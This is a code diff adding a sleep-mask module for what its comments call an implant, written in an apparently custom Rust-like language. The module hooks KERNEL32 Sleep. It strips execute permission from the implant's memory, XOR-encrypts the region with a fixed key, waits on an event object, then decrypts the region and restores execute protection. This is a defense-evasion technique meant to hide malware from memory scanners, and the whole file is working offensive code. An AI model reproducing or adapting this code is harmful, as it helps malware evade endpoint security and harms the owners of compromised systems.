@@ -1,0 +1,53 @@
+
+use opsec_sleep_mask;
+
+static __opsec_sleep_base: u64 = 0;
+static __opsec_sleep_size: u64 = 0;
+static __opsec_sleep_key:  u8  = (u8)0x5A;
+// PAGE_EXECUTE_READ. Override to PAGE_EXECUTE_READWRITE (0x40)
+// if your loader put the implant in RWX.
+static __opsec_sleep_prot: u32 = (u32)0x20;
+// One-shot signalable handle (CreateEventA) that
+// WaitForSingleObject blocks on. Lazily created on first hook
+// call so we don't pay the cost on builds where Sleep never fires.
+static __opsec_sleep_event: u64 = 0;
+
+[Hook("KERNEL32$Sleep")]
+fn __opsec_sleep_hook(ms: u32) -> void {
+    var sz: u64 = __opsec_sleep_size;
+    var k:  u8  = __opsec_sleep_key;
+    var base: u64 = __opsec_sleep_base;
+    var orig_prot: u32 = __opsec_sleep_prot;
+
+    if sz != 0 {
+        var old: u32 = 0;
+        // 0x04 = PAGE_READWRITE. Strips execute; allows write
+        // (needed for the XOR pass).
+        opsec_set_protect(base, sz, (u32)0x04, &old);
+        opsec_xor_region(base, sz, k);
+    }
+
+    var h: u64 = __opsec_sleep_event;
+    if h == 0 {
+        // Manual-reset, non-signaled, no name. The handle is
+        // never set or closed - the kernel reaps it at process
+        // exit. We just need a wait target.
+        h = (u64)Kernel32.CreateEventA((void*)0, 1, 0, (char*)0);
+        __opsec_sleep_event = h;
+    }
+    if h != 0 {
+        Kernel32.WaitForSingleObject((void*)h, ms);
+    } else {
+        // CreateEventA failed (extremely rare). Fall back to the
+        // real Sleep so the implant doesn't bottleneck.
+        Kernel32.Sleep(ms);
+    }
+
+    if sz != 0 {
+        opsec_xor_region(base, sz, k);
+        // Restore the original page protection.
+        var dummy: u32 = 0;
+        opsec_set_protect(base, sz, orig_prot, &dummy);
+    }
+    ret;
+}
